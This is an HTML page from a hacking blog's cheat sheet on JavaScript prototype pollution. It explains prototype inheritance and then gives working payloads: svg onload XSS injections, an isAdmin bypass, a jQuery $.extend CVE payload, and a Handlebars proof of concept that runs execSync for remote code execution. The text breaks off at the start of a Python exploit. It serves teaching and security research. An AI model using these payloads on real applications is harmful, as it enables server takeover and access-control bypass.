<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> NodeJS - __proto__ & prototype Pollution | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/logos/m1N147z1.png?c5fa12f00bf81b0bfdfb738a6722b18c"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/deserialization/nodejs-proto-prototype-pollution/NodeJS-prototype-Pollution/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">~|h0m3|~ </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">~|bl0g|~ </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">~|h4Ck1n6|~ <span class="sr-only">(current)</span> </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">~|m0Re|~ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/misc/">miscelanea</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">NodeJS - __proto__ & prototype Pollution</h1> <p class="post-description"></p> </header> <article> <h2 id="objects-in-javascript-">Objects in JavaScript <a href="#id-053a" id="id-053a"></a></h2> <p>Objects in JavaScript are essentially collections of key-value pairs, known as properties. An object can be created using <code class="language-plaintext highlighter-rouge">Object.create</code> with <code class="language-plaintext highlighter-rouge">null</code> as an argument to produce an empty object. This method allows the creation of an object without any inherited properties.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Run this in the developers tools console</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="kc">null</span><span class="p">));</span> <span class="c1">// This will output an empty object.</span>
</code></pre></div></div> <p>An empty object is akin to an empty dictionary, represented as <code class="language-plaintext highlighter-rouge">{}</code>.</p> <h3 id="functions-and-classes-in-javascript">Functions and Classes in JavaScript</h3> <p>In JavaScript, classes and functions are closely linked, with functions often serving as constructors for classes. Despite JavaScript’s lack of native class support, constructors can emulate class behavior.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Run this in the developers tools console</span>

<span class="kd">function</span> <span class="nf">Employee</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">position</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="nx">position</span><span class="p">;</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">introduce</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="dl">"</span><span class="s2">My name is </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> and I work as a </span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">position</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">;</span>
  <span class="p">};</span>
<span class="p">}</span>

<span class="nx">Employee</span><span class="p">.</span><span class="nx">prototype</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">employee1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Employee</span><span class="p">(</span><span class="dl">"</span><span class="s2">Generic Employee</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Developer</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">employee1</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span>
</code></pre></div></div> <h3 id="prototypes-in-javascript">Prototypes in JavaScript</h3> <p>JavaScript allows the modification, addition, or deletion of prototype attributes at runtime. This flexibility enables the dynamic extension of class functionalities.</p> <p>Functions like <code class="language-plaintext highlighter-rouge">toString</code> and <code class="language-plaintext highlighter-rouge">valueOf</code> can be altered to change their behavior, demonstrating the adaptable nature of JavaScript’s prototype system.</p> <h2 id="inheritance">Inheritance</h2> <p>In prototype-based programming, properties/methods are inherited by objects from classes. These classes are created by adding properties/methods either to an instance of another class or to an empty object.</p> <p>It should be noted that when a property is added to an object serving as the prototype for other objects (such as <code class="language-plaintext highlighter-rouge">myPersonObj</code>), the inheriting objects gain access to this new property. However, this property is not automatically displayed unless it is explicitly invoked.</p> <h2 id="__proto__-pollution-">__proto__ pollution <a href="#id-0d0a" id="id-0d0a"></a></h2> <h2 id="exploring-prototype-pollution-in-javascript">Exploring Prototype Pollution in JavaScript</h2> <p>JavaScript objects are defined by key-value pairs and inherit from the JavaScript Object prototype. This means altering the Object prototype can influence all objects in the environment.</p> <p>Let’s use a different example to illustrate:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">Vehicle</span><span class="p">(</span><span class="nx">model</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">model</span> <span class="o">=</span> <span class="nx">model</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">car1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Vehicle</span><span class="p">(</span><span class="dl">"</span><span class="s2">Tesla Model S</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <p>Access to the Object prototype is possible through:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">car1</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span>
<span class="nx">Vehicle</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">;</span>
</code></pre></div></div> <p>By adding properties to the Object prototype, every JavaScript object will inherit these new properties:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">Vehicle</span><span class="p">(</span><span class="nx">model</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">model</span> <span class="o">=</span> <span class="nx">model</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">car1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Vehicle</span><span class="p">(</span><span class="dl">"</span><span class="s2">Tesla Model S</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// Adding a method to the Object prototype</span>
<span class="nx">car1</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">announce</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Beep beep!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>
<span class="nx">car1</span><span class="p">.</span><span class="nf">announce</span><span class="p">();</span> <span class="c1">// Outputs "Beep beep!"</span>
<span class="c1">// Adding a property to the Object prototype</span>
<span class="nx">car1</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">isVehicle</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">car1</span><span class="p">.</span><span class="nx">isVehicle</span><span class="p">);</span> <span class="c1">// Outputs true</span>
</code></pre></div></div> <h2 id="prototype-pollution">prototype pollution</h2> <p>For a scenario where <code class="language-plaintext highlighter-rouge">__proto__</code> usage is restricted, modifying a function’s prototype is an alternative:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">Vehicle</span><span class="p">(</span><span class="nx">model</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nx">model</span> <span class="o">=</span> <span class="nx">model</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">car1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Vehicle</span><span class="p">(</span><span class="dl">"</span><span class="s2">Tesla Model S</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// Adding properties to the Vehicle prototype</span>
<span class="nx">Vehicle</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">beep</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Beep beep!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>
<span class="nx">car1</span><span class="p">.</span><span class="nf">beep</span><span class="p">();</span> <span class="c1">// Now works and outputs "Beep beep!"</span>
<span class="nx">Vehicle</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">hasWheels</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">car1</span><span class="p">.</span><span class="nx">hasWheels</span><span class="p">);</span> <span class="c1">// Outputs true</span>

<span class="c1">// Alternate method</span>
<span class="nx">car1</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">honk</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Honk!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>
<span class="nx">car1</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">isElectric</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</code></pre></div></div> <p>This affects only objects created from the <code class="language-plaintext highlighter-rouge">Vehicle</code> constructor, giving them the <code class="language-plaintext highlighter-rouge">beep</code>, <code class="language-plaintext highlighter-rouge">hasWheels</code>, <code class="language-plaintext highlighter-rouge">honk</code>, and <code class="language-plaintext highlighter-rouge">isElectric</code> properties.</p> <p>Two methods to globally affect JavaScript objects through prototype pollution include:</p> <ol> <li>Polluting the <code class="language-plaintext highlighter-rouge">Object.prototype</code> directly:</li> </ol> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">goodbye</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Goodbye!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div> <ol> <li>Polluting the prototype of a constructor for a commonly used structure:</li> </ol> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">example</span> <span class="o">=</span> <span class="p">{</span> <span class="na">key</span><span class="p">:</span> <span class="dl">"</span><span class="s2">value</span><span class="dl">"</span> <span class="p">};</span>
<span class="nx">example</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">greet</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Hello!</span><span class="dl">"</span><span class="p">);</span>
<span class="p">};</span>
</code></pre></div></div> <p>After these operations, every JavaScript object can execute <code class="language-plaintext highlighter-rouge">goodbye</code> and <code class="language-plaintext highlighter-rouge">greet</code> methods.</p> <h2 id="polluting-other-objects">Polluting other objects</h2> <h3 id="from-a-class-to-objectprototype">From a class to Object.prototype</h3> <p>In an scenario where you can <strong>pollute an specific object</strong> and you need to <strong>get to <code class="language-plaintext highlighter-rouge">Object.prototype</code></strong> you can search for it with something like the following code:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/</span>

<span class="c1">// Search from "window" object</span>
<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">getOwnPropertyNames</span><span class="p">(</span><span class="nb">window</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]?.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">===</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Imagine that the original object was document.querySelector('a')</span>
<span class="c1">// With this code you could find some attributes to get the object "window" from that one</span>
<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">key1</span> <span class="k">in</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">key2</span> <span class="k">in</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)[</span><span class="nx">key1</span><span class="p">])</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">querySelector</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)[</span><span class="nx">key1</span><span class="p">][</span><span class="nx">key2</span><span class="p">]</span> <span class="o">===</span> <span class="nb">window</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key1</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">.</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">key2</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <h3 id="array-elements-pollution">Array elements pollution</h3> <p>Note that as you can pollute attributes of objects in JS, if you have access to pollute an array you can also <strong>pollute values of the array</strong> accessible <strong>by indexes</strong> (note that you cannot overwrite values, so you need to pollute indexes that are somehow used but not written).</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">c</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">];</span>
<span class="nx">a</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nx">a</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">yolo</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">b</span> <span class="o">=</span> <span class="p">[];</span>
<span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">//undefined</span>
<span class="nx">b</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">//"yolo"</span>
<span class="nx">c</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 2 -- not</span>
</code></pre></div></div> <h3 id="html-elements-pollution">Html elements pollution</h3> <p>When generating a HTML element via JS it’s possible to <strong>overwrite</strong> the <strong><code class="language-plaintext highlighter-rouge">innerHTML</code></strong> attribute to make it write <strong>arbitrary HTML code.</strong> <a href="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">Idea and example from this writeup</a>.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Create element</span>
<span class="nx">devSettings</span><span class="p">[</span><span class="dl">"</span><span class="s2">root</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">main</span><span class="dl">'</span><span class="p">)</span>

<span class="c1">// Pollute innerHTML</span>
<span class="nx">settings</span><span class="p">[</span><span class="nx">root</span><span class="p">][</span><span class="nx">innerHTML</span><span class="p">]</span><span class="o">=&lt;</span><span class="dl">"</span><span class="s2">svg onload=alert(1)&gt;</span><span class="dl">"</span>

<span class="c1">// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload</span>
<span class="nx">settings</span><span class="p">[</span><span class="nx">root</span><span class="p">][</span><span class="nx">ownerDocument</span><span class="p">][</span><span class="nx">body</span><span class="p">][</span><span class="nx">innerHTML</span><span class="p">]</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;svg onload=alert(document.domain)&gt;</span><span class="dl">"</span>
</code></pre></div></div> <h2 id="examples">Examples</h2> <h3 id="basic-example">Basic Example</h3> <p>A prototype pollution occurs due to a flaw in the application that allows overwriting properties on <code class="language-plaintext highlighter-rouge">Object.prototype</code>. This means that since most objects derive their properties from <code class="language-plaintext highlighter-rouge">Object.prototype</code></p> <p>The easies example is to add a value to an <strong>undefiner attribute of an object</strong> that is going to be checked, like:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">admin</span><span class="p">)</span> <span class="p">{</span>
</code></pre></div></div> <p>If the attribute <strong><code class="language-plaintext highlighter-rouge">admin</code> is undefined</strong> it’s possible to abuse a PP and set it to True with something like:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">isAdmin</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">;</span> <span class="c1">// true</span>
</code></pre></div></div> <p>The mechanism behind this involves manipulating properties such that if an attacker has control over certain inputs, they can modify the prototype of all objects in the application. This manipulation typically involves setting the <code class="language-plaintext highlighter-rouge">__proto__</code> property, which, in JavaScript, is synonymous with directly modifying an object’s prototype.</p> <p>The conditions under which this attack can be successfully executed, as outlined in a specific <a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">study</a>, include:</p> <ul> <li>Performing a recursive merge.</li> <li>Defining properties based on a path.</li> <li>Cloning objects.</li> </ul> <h3 id="override-function">Override function</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">customer</span><span class="p">.</span><span class="n">__proto__</span><span class="p">.</span><span class="n">toString</span> <span class="o">=</span> <span class="p">()</span><span class="o">=&gt;</span><span class="p">{</span><span class="nf">alert</span><span class="p">(</span><span class="sh">"</span><span class="s">polluted</span><span class="sh">"</span><span class="p">)}</span>
</code></pre></div></div> <h3 id="proto-pollution-to-rce">Proto Pollution to RCE</h3> <p>prototype-pollution-to-rce.md</p> <p>Other payloads:</p> <ul> <li><a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">https://github.com/KTH-LangSec/server-side-prototype-pollution</a></li> </ul> <h2 id="client-side-prototype-pollution-to-xss">Client-side prototype pollution to XSS</h2> <p>client-side-prototype-pollution.md</p> <h3 id="cve-201911358-prototype-pollution-attack-through-jquery--extend">CVE-2019–11358: Prototype pollution attack through jQuery $ .extend</h3> <p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">For further details check this article</a> In jQuery, the <code class="language-plaintext highlighter-rouge">$ .extend</code> function can lead to prototype pollution if the deep copy feature is utilized improperly. This function is commonly used for cloning objects or merging properties from a default object. However, when misconfigured, properties intended for a new object can be assigned to the prototype instead. For instance:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="p">{},</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"__proto__": {"devMode": true}}</span><span class="dl">'</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">({}.</span><span class="nx">devMode</span><span class="p">);</span> <span class="c1">// Outputs: true</span>
</code></pre></div></div> <p>This vulnerability, identified as CVE-2019–11358, illustrates how a deep copy can inadvertently modify the prototype, leading to potential security risks, such as unauthorized admin access if properties like <code class="language-plaintext highlighter-rouge">isAdmin</code> are checked without proper existence verification.</p> <h3 id="cve-20183721-cve-201910744-prototype-pollution-attack-through-lodash">CVE-2018–3721, CVE-2019–10744: Prototype pollution attack through lodash</h3> <p><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">For further details check this article</a></p> <p><a href="https://www.npmjs.com/package/lodash">Lodash</a> encountered similar prototype pollution vulnerabilities (CVE-2018–3721, CVE-2019–10744). These issues were addressed in version 4.17.11.</p> <h3 id="another-tutorial-with-cves">Another tutorial with CVEs</h3> <p>https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2</p> <h3 id="tools-to-detect-prototype-pollution">Tools to detect Prototype Pollution</h3> <ul> <li><a href="https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner"><strong>Server-Side-Prototype-Pollution-Gadgets-Scanner</strong></a>: Burp Suite extension designed to detect and analyze server-side prototype pollution vulnerabilities in web applications. This tool automates the process of scanning requests to identify potential prototype pollution issues. It exploits known gadgets - methods of leveraging prototype pollution to execute harmful actions - particularly focusing on Node.js libraries.</li> <li><a href="https://github.com/portswigger/server-side-prototype-pollution"><strong>server-side-prototype-pollution</strong></a>: This extension identifies server side prototype pollution vulnerabilities. It uses techniques described in the <a href="https://portswigger.net/research/server-side-prototype-pollution">server side prototype pollution</a>.</li> </ul> <h3 id="ast-prototype-pollution-in-nodejs">AST Prototype Pollution in NodeJS</h3> <p>NodeJS extensively utilizes Abstract Syntax Trees (AST) in JavaScript for functionalities like template engines and TypeScript. This section explores the vulnerabilities related to prototype pollution in template engines, specifically Handlebars and Pug.</p> <h4 id="handlebars-vulnerability-analysis">Handlebars Vulnerability Analysis</h4> <p>The Handlebars template engine is susceptible to a prototype pollution attack. This vulnerability arises from specific functions within the <code class="language-plaintext highlighter-rouge">javascript-compiler.js</code> file. The <code class="language-plaintext highlighter-rouge">appendContent</code> function, for instance, concatenates <code class="language-plaintext highlighter-rouge">pendingContent</code> if it’s present, while the <code class="language-plaintext highlighter-rouge">pushSource</code> function resets <code class="language-plaintext highlighter-rouge">pendingContent</code> to <code class="language-plaintext highlighter-rouge">undefined</code> after adding the source.</p> <p><strong>Exploitation Process</strong></p> <p>The exploitation leverages the AST (Abstract Syntax Tree) produced by Handlebars, following these steps:</p> <ol> <li><strong>Manipulation of the Parser</strong>: Initially, the parser, via the <code class="language-plaintext highlighter-rouge">NumberLiteral</code> node, enforces that values are numeric. Prototype pollution can circumvent this, enabling the insertion of non-numeric strings.</li> <li><strong>Handling by the Compiler</strong>: The compiler can process an AST Object or a string template. If <code class="language-plaintext highlighter-rouge">input.type</code> equals <code class="language-plaintext highlighter-rouge">Program</code>, the input is treated as pre-parsed, which can be exploited.</li> <li><strong>Injection of Code</strong>: Through manipulation of <code class="language-plaintext highlighter-rouge">Object.prototype</code>, one can inject arbitrary code into the template function, which may lead to remote code execution.</li> </ol> <p>An example demonstrating the exploitation of the Handlebars vulnerability:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">Handlebars</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">handlebars</span><span class="dl">"</span><span class="p">);</span>

<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">Program</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="p">[</span>
  <span class="p">{</span>
    <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">MustacheStatement</span><span class="dl">"</span><span class="p">,</span>
    <span class="na">path</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="na">params</span><span class="p">:</span> <span class="p">[</span>
      <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">NumberLiteral</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">value</span><span class="p">:</span> <span class="dl">"</span><span class="s2">console.log(process.mainModule.require('child_process').execSync('id').toString())</span><span class="dl">"</span><span class="p">,</span>
      <span class="p">},</span>
    <span class="p">],</span>
    <span class="na">loc</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">start</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
      <span class="na">end</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="p">},</span>
  <span class="p">},</span>
<span class="p">];</span>

<span class="kd">const</span> <span class="nx">source</span> <span class="o">=</span> <span class="s2">`Hello `</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">template</span> <span class="o">=</span> <span class="nx">Handlebars</span><span class="p">.</span><span class="nf">precompile</span><span class="p">(</span><span class="nx">source</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">(</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">template</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">)</span><span class="dl">"</span><span class="p">)[</span><span class="dl">"</span><span class="s2">main</span><span class="dl">"</span><span class="p">].</span><span class="nf">toString</span><span class="p">());</span>
</code></pre></div></div> <p>This code showcases how an attacker could inject arbitrary code into a Handlebars template.</p> <p><strong>External Reference</strong>: An issue related to prototype pollution was found in the ‘flat’ library, as detailed here: <a href="https://github.com/hughsk/flat/issues/105">Issue on GitHub</a>.</p> <p><strong>External Reference</strong>: <a href="https://github.com/hughsk/flat/issues/105">Issue related to prototype pollution in the ‘flat’ library</a></p> <p>Example of prototype pollution exploit in Python:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

